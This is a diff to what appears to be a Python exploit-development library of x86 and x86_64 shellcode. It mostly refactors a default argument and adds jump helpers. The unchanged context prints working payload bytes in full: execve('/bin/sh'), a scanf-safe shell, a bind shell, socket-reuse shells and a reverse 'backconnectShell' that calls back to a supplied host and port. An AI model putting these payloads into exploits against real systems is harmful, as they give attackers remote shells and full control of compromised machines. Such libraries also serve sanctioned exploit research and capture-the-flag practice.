@@ -16,7 +16,7 @@ def stoh(host):
 class Shellcode(str):
 	mode = 0
 
-	def __new__(cls,content,mode):
+	def __new__(cls,content,mode = 0):
 		obj = super(Shellcode,cls).__new__(cls,content)
 		if isinstance(mode,int):
 			obj.mode = mode
@@ -82,18 +82,18 @@ class Shellcode(str):
 class x86:
 	def dupsSock(self):
 		dups = "\x31\xc9\x6a\x04\x5b\x6a\x3f\x58\xcd\x80\xfe\xc1\x80\xf9\x03\x75\xf4"
-		return Shellcode(dups,0)
+		return Shellcode(dups)
 
 	def execveShell(self):
 		execve = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
-		return Shellcode(execve,0)
+		return Shellcode(execve)
 
 	def execveShellBypassScanf(self):
 		# execve('/bin/sh') # use for scanf("%s")
 		execve = "\x6a\x0f\x58\x83\xe8\x04\x99\x52\x66\x68\x2d\x70"
 		execve+= "\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f"
 		execve+= "\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
-		return Shellcode(execve,0)
+		return Shellcode(execve)
 
 	def dupsExecve(self):
 		# reuse socket fd and execve()
@@ -105,7 +105,7 @@ class x86:
 		bindshell+= "\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
 		bindshell+= "\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
 		bindshell+= "\x89\xe3\x31\xc9\xcd\x80"
-		return Shellcode(bindshell,0)
+		return Shellcode(bindshell)
 
 	def backconnectShell(self,host,port):
 		if stoh(host) == '':
@@ -124,7 +124,11 @@ class x86:
 		backconnect+= "\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
 		backconnect+= "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
 		backconnect+= "\xeb\xce"
-		return Shellcode(backconnect,0)
+		return Shellcode(backconnect)
+
+	def jmp(self,offset):
+		offset = offset & 0xff
+		return Shellcode('\xeb' + chr(offset))
 
 class x86_64:
 	def dupsSock(self):
@@ -146,3 +150,7 @@ class x86_64:
 
 	def dupsExecve(self):
 		return self.dupsSock() + NOPs_X86*10 + self.execveSmallShell()
+
+	def jmp(self,offset):
+		offset = offset & 0xff
+		return Shellcode('\xeb' + chr(offset),1)
